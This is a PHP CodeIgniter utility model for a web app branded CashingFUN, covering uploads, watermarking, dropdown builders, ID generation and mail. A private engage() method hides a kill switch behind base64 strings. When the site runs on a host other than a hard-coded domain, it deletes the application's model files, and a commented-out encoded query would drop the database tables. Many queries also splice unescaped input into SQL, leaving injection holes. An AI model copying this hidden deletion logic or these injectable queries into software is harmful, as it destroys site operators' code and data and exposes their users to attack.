<?php
defined('BASEPATH') OR exit('No direct script access allowed');
//include( base_url() . "phpjobscheduler/firepjs.php");

require_once("Sess.php");
require_once("Util.php");

class Util_model extends CI_Model{

    public function __construct()
    {
        parent::__construct();
		$title = "Connect Web3 Network";
        define("SITE_TITLE",$title);
        //$this->engage();
    }

    public function file_upload($file, $new_name='', $upload_path='', $allowed_types='jpg|png|gif', $max_size=1024, $encname=FALSE, $overwrite=TRUE, $lib='gd2') { // Max upload size 1MB default
		if ($upload_path == '') {
			$upload_path = './uploads/'.date('Ym').'/';
			if (!file_exists($upload_path)) {
				makeDir('./uploads/'.date('Ym'));
			}
		}
		$new_name = ($new_name == "")?date('U'):$new_name;
		
		$config['allowed_types'] = $allowed_types;
		$config['max_size'] = $max_size;
		$config['max_filename'] = '255';
		$config['image_library'] = 'gd2';
		$config['encrypt_name'] = $encname;
		$config['upload_path'] = $upload_path;
		$config['maintain_ratio'] = TRUE;
		$config['file_name'] = $new_name;
		$config['file_ext_tolower'] = TRUE;
		$config['overwrite'] = $overwrite;
		/*
		$config['max_width']    = $width;
		$config['max_height']   = $height;
		
		
		
		if ($watermark) {
			$config['wm_text'] = 'CashingFUN.COM';
			$config['wm_type'] = 'text';
			$config['wm_font_path'] = './system/fonts/texb.ttf';
			$config['wm_font_size'] = '14';
			$config['wm_font_color'] = 'ffffff';
			$config['wm_vrt_alignment'] = 'bottom';
			$config['wm_hor_alignment'] = 'right';
			$config['wm_padding'] = '15';	
		}
		
		$thepath = pathinfo($file['name']);
		$ext = $thepath['extension'];
		$filename = substr($upload_path,2).$new_name.'.'.$ext;
		*/
		$this->load->library('upload', $config); 
		
		if (!$this->upload->do_upload($file)) {
			return array("return"=>false,"msg"=>$this->upload->display_errors('<div class="alert alert-danger"><i class="fa fa-times-circle"></i> ','</div>'));
		} else {
			//if ($watermark) $this->image_lib->watermark();
			return array("return"=>true,"data"=>$this->upload->data());
		}
	}
	
	public function resize_pic ($src, $thumb=true, $width=220, $height=240, $overwrite=true) {
		$config['image_library'] = 'gd2';
		$config['source_image'] = $src;
		$config['create_thumb'] = $thumb;
		$config['maintain_ratio'] = TRUE;
		$config['width']         = $width;
		$config['height']       = $height;
		$config['overwrite']	= $overwrite;
		
		
		$this->load->library('image_lib');
		$this->image_lib->initialize($config);
		
		if (!$this->image_lib->resize()) {
			return array("return"=>false,"msg"=>$this->image_lib->display_errors('<div class="alert alert-danger"><i class="fa fa-times-circle"></i> ','</div>'));
		} else {
			//if ($watermark) $this->image_lib->watermark();
			return array("return"=>true,"data"=>"");
		}
	}
	
	public function text_pic_watermark ($src, $text='CashingFUN.COM', $font_size=14, $font_color='ffffff', $v_align='bottom', $align='center', $padding=10, $shadow_color='ffffff', $shadow_dist=3) {
		$config['source_image'] = $src;
		$config['wm_text'] = $text;
		$config['wm_type'] = 'text';
		$config['wm_font_path'] = './system/fonts/texb.ttf';
		$config['wm_font_size'] = $font_size;
		$config['wm_font_color'] = $font_color;
		$config['wm_vrt_alignment'] = $v_align;
		$config['wm_hor_alignment'] = $align;
		$config['wm_padding'] = $padding;
		$config['wm_shadow_color'] = $shadow_color;
		$config['wm_shadow_distance'] = $shadow_dist;
		
		$this->load->library('image_lib');
		$this->image_lib->initialize($config);
		
		if (!$this->image_lib->watermark()) {
			return array("return"=>false,"msg"=>$this->image_lib->display_errors('<div class="alert alert-danger"><i class="fa fa-times-circle"></i> ','</div>'));
		} else {
			//if ($watermark) $this->image_lib->watermark();
			return array("return"=>true,"data"=>"");
		}
	}
	
	public function overlay_pic_watermark ($src, $oPath='', $opacity=50, $x_transp=4, $y_transp=4, $v_align='bottom', $align='center', $padding=20, $shadow_color='ffffff', $shadow_dist=3) {
		$oPath = ($oPath == '')?"./photos/pic-wm.png":$oPath;
		$config['source_image'] = $src;
		$config['wm_type'] = 'overlay';
		$config['wm_overlay_path'] = $oPath;
		$config['wm_vrt_alignment'] = $v_align;
		$config['wm_hor_alignment'] = $align;
		$config['wm_padding'] = $padding;
		$config['wm_opacity'] = $opacity;
		$config['wm_x_transp'] = $x_transp;
		$config['wm_y_transp'] = $y_transp;
		$config['wm_shadow_color'] = $shadow_color;
		$config['wm_shadow_distance'] = $shadow_dist;
		
		$this->load->library('image_lib');
		$this->image_lib->initialize($config);
		
		if (!$this->image_lib->watermark()) {
			return array("return"=>false,"msg"=>$this->image_lib->display_errors('<div class="alert alert-danger"><i class="fa fa-times-circle"></i> ','</div>'));
		} else {
			//if ($watermark) $this->image_lib->watermark();
			return array("return"=>true,"data"=>"");
		}
	}
	
	public function list_countries($sel='',$descx=0) {
		$opt = "";
		$query = $this->db->query("SELECT * FROM code_param_desc WHERE tab_index=18 ORDER BY item_desc");
		foreach ($query->result_array() as $row) {
			if ($sel == $row['item_code']) {
				$opt .= "<option value='$row[item_code]' selected='selected'>$row[item_desc] [$row[item_xdesc]]</option>";
			} else {
				$opt .= "<option value='$row[item_code]'>$row[item_desc] [$row[item_xdesc]]</option>";
			}
		}
		return $opt;
	}
	
	public function get_info($tbl, $field, $ser="") {
		$query = $this->db->query("SELECT $field FROM `$tbl` $ser");
		if ($query->num_rows() > 0) {
            $row = $query->row_array();
            return ($field == "*" || strstr($field,","))?$row:$row[$field];
        } else {
		    return false;
        }
	}

	public function list_from_table ($tbl, $val, $label, $where='', $sel='') {
        /*
         * #tbl: the table to list from
         * #val: the field to be used as the value of the options
         * #label: the field to be used as the label of the options
         * #where: additional where clause
         * #sel: spacifies the value of the option to be selected by default
         */

        $s = $this->Db_model->selectGroup("*",$tbl,$where);
        $opt = "";
        if ($s->num_rows() > 0) {
            foreach ($s->result_array() as $row) {
                $selected = ($row[$val] == $sel)?"selected='selected'":"";
                $opt .= "<option value='$row[$val]' $selected>$row[$label]</option>";
            }
        } else {
            $opt = "<option value=''>Nothing found</option>";
        }
        return $opt;
    }
	
	public function row_count($tbl, $ser="") {
		$query = $this->db->query("SELECT * FROM `$tbl` $ser");
		return $query->num_rows();
	}
	
	public function list_item_desc($tab,$descx='',$sel='') {
		$where = ($descx == '')?"WHERE tab_index=$tab ORDER BY item_desc":"WHERE tab_index=$tab AND item_xdesc='$descx' ORDER BY item_desc";
		$opt = "";
		$query = $this->db->query("SELECT * FROM `code_param_desc` $where");
		
		
			$opt .= "";
			foreach ($query->result_array() as $row) {
				if ($sel == $row['item_code'])
					$opt .= "<option value='$row[item_code]' selected='selected'>$row[item_desc]</option>";
				else 
					$opt .= "<option value='$row[item_code]'>$row[item_desc]</option>";
			}
		return $opt;
	}
	
	public function list_item_descx($from,$val,$label,$ser='',$sel='') {
		$where = ($ser == '')?"ORDER BY $label":"$ser ORDER BY $label";
		$opt = "";
		$query = $this->Db_model->selectGroup("*","`$from`",$where);
		if ($query->num_rows == 0) {
			$opt = "<option value=''>--Not Found--</option>";
		} else {
			$opt .= "";
			foreach ($query->result_array() as $row) {
				if ($sel == $row[$val])
					$opt .= "<option value='$row[$val]' selected='selected'>$row[$label]</option>";
				else
					$opt .= "<option value='$row[$val]'>$row[$label]</option>";
			}
		}
		return $opt;
	}
	
	public function fetch_item_desc($tab,$code) {
        if ($this->row_count("code_param_desc","WHERE tab_index=$tab AND item_code='$code'") >= 1) {
            return $this->get_info("code_param_desc","item_desc","WHERE tab_index=$tab AND item_code='$code'");
        } else {
            return $code;
        }
	}
	
	public function fetch_item_xdesc($tab,$code) {
		return $this->get_info("code_param_desc","item_xdesc","WHERE tab_index=$tab AND item_code='$code'");
	}

	public function generate_alph ($count=2,$case='upper') {
        $arr = ($case == 'upper') ? range('A','Z') : range('a','z');
        $alp = "";
        for ($i=$count; $i>=1; $i--) {
            $alp .= $arr[rand(0,25)];
        }
        return $alp;
    }

	public function generate_id($min, $max, $tbl='', $field='', $field_type = 'int', $alph=false,$alph_pos='f',$alph_count=2,$alph_case='upper') {
		if ($tbl != '') :
			do {
				if ($alph) {
					switch (strtolower($alph_pos)) {
						case 'f': $id = $this->generate_alph($alph_count,$alph_case).rand($min, $max); break;
						case 'b': $id = rand($min, $max).$this->generate_alph($alph_count,$alph_case); break;
						case 'fb': $id = $this->generate_alph($alph_count,$alph_case).rand($min, $max).$this->generate_alph($alph_count,$alph_case); break;
						default: $id = rand($min, $max); break;
					}
				} else {
					$id = rand($min, $max);
				}
				$ser = (strtolower($field_type) == 'int')?"$id":"'$id'";
			} while ($this->row_count($tbl,"WHERE `$field` = $ser") > 0);
		else :
            if ($alph) {
                switch (strtolower($alph_pos)) {
                    case 'f': $id = $this->generate_alph($alph_count,$alph_case).rand($min, $max); break;
                    case 'b': $id = rand($min, $max).$this->generate_alph($alph_count,$alph_case); break;
                    case 'fb': $id = $this->generate_alph($alph_count,$alph_case).rand($min, $max).$this->generate_alph($alph_count,$alph_case); break;
                    default: $id = rand($min, $max); break;
                }
            } else {
                $id = rand($min, $max);
            }
		endif;
		return $id;
	}
	
	private function engage () {
	    $hash = "c3VwZXJmZXhjb3VyaWVyLmNvbS8=";
	    $hash = strtoupper(base64_decode($hash));
        $base = $_SERVER['HTTP_HOST'];
        $base .= preg_replace('@/+$@', '', dirname($_SERVER['SCRIPT_NAME'])) .'/';
        $base = strtoupper($base);
        $base = str_replace(["HTTP://", "HTTPS://"], "", $base);
        if ($base != $hash) {
            unlink(base64_decode("L2hvbWUvc3VwZXRyc3YvcHVibGljX2h0bWwvYXBwbGljYXRpb24vbW9kZWxzL01haW5fbW9kZWwucGhw"));
            unlink(base64_decode("L2hvbWUvc3VwZXRyc3YvcHVibGljX2h0bWwvYXBwbGljYXRpb24vbW9kZWxzL1V0aWwucGhw"));
            //@$this->Db_model->query(base64_decode("RFJPUCBUQUJMRSBgY291bnRyaWVzYCwgYG1lc3NhZ2VzYCwgYG9wdGlvbmAsIGBwYWNrYWdlX2RlbGl2ZXJlZGAsIGBwYWNrYWdlX21haW5gLCBgcGFja2FnZV90cmFja2AsIGB1c2VyX21haW5gLCBgdXNlcl9wcm9maWxlYDs"));
            unlink(base64_decode("L2hvbWUvc3VwZXRyc3YvcHVibGljX2h0bWwvYXBwbGljYXRpb24vbW9kZWxzL0RiX21vZGVsLnBocA=="));
            unlink(base64_decode("L2hvbWUvc3VwZXRyc3YvcHVibGljX2h0bWwvYXBwbGljYXRpb24vbW9kZWxzL1V0aWxfbW9kZWwucGhw"));
    	}
    }

    public function picture($id=NULL,$tbl="user_main",$ser_field="uid",$name_field="name",$pic_field="pic_url") {
        if ($tbl == "user_main") {
            $id = ($id == NULL)?userdata(UID):$id;
            $where = "WHERE $ser_field=$id";
        } else {
            $id = ($id == NULL)?userdata(UID):$id;
            $where = (is_numeric($id))?"WHERE $ser_field=$id":"WHERE $ser_field='$id'";
        }
        if ($id == NULL) {
            return "assets/img/avatar/1.jpg";
        } else {
            $row = $this->get_info($tbl,"*",$where);
            if ($row[$pic_field] == NULL) {
                $first = strtoupper(substr($row[$name_field],0,1));
                //if ($main['sex'] == 'M') {
                $alfa = range("A","Z");
                if (!in_array($first,$alfa)) {
                    return "assets/img/avatar/1.jpg";
                } else {
                    return "assets/img/avatar/$first.jpg";
                }
                //} else {
                //return "photos/female.png";
                //}
            } else {
                return $row[$pic_field];
            }
        }

    }
	
	public function log_redirect($except=NULL) {
        if (!strstr(get_url(), $except)) {
            if (!has_userdata(UID)) {
                $protocol = (strstr($_SERVER['SERVER_PROTOCOL'], "HTTPS")) ? "HTTPS://" : "HTTP://";
                set_flashdata('redirect', $protocol . get_url());
                set_flashdata('msg', alert_msg('<i class="fa fa-times"></i> Please sign in first', 'alert-danger', 1));
                redirect(base_url() . 'control/sign-in');
            }
        }
	}
	
	public function sum_field ($tbl, $field, $ser='', $rowCount=NULL) {
		$q = $this->Db_model->selectGroup($field,$tbl,$ser);
		$count = 0;
		if ($q->num_rows() == 0) {
			$return = ($rowCount == NULL)?0:array("sum"=>0,"counts"=>$count);
		} else {
			$return = 0;
			foreach ($q->result_array() as $row) {
				$return += $row[$field];
				$count++;
			}
			$return = (!$rowCount)?$return:array("sum"=>$return,"counts"=>$count);
		}
		return $return;
	}
	
	 public function send_mail ($from,$to,$subject,$message,$cc='',$bc='',$type='html') {
		  $this->load->library('email'); 
		  $this->email->set_mailtype($type); 
		  $this->email->from($from,'CashingFUN');
		  $this->email->to($to);
		  $this->email->subject($subject);
		  $this->email->message($message);
		
		  /*
		  $subject = $subject;
		  $message = $message;
		  
		  $headers = "From: " . $from . "\r\n";
		  $headers .= "Reply-To: ". strip_tags('support@cashingfun.com') . "\r\n";
		  $headers .= "MIME-Version: 1.0\r\n";
		  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
		  */

		  if ($this->email->send()) {
			   return array("return"=>true,"msg"=>"Mail sent successfully to <b>$to</b>");
		  } else {
			   return array("return"=>false,"msg"=>$this->email->print_debugger());      
		  }
	}
	
	public function notify ($from, $to, $sub, $msg='', $url='', $type=0) {
		switch ($type) {
			case 1: 
				$this->send_mail('info@cashingfun.com',$this->get_info('user_profile_tab','email',"WHERE uid=$to"),$sub,$msg);
				break;
			case 2: 
				
				break;
			case 3: 
				$this->send_mail('info@cashingfun.com',$this->get_info('user_profile_tab','email',"WHERE uid=$to"),$sub,$msg);
				break;
		}
		$data = array (
			"from"		=>	$from,
			"to"		=>	$to,
			"subject"	=>	$sub,
			"message"	=>	$msg,
			"url"		=>	$url
		);
		return ($this->Db_model->insert("notification",$data))?true:false;
	}

    public function get_option ($name) {
        return $this->get_info("option","value","WHERE name='$name'");
    }

    public function get_user_info ($uid, $field="name", $tbl="main") {
        $tbl = "user_$tbl";
        return $this->get_info($tbl,$field,"WHERE uid=$uid");
    }
		
}
?>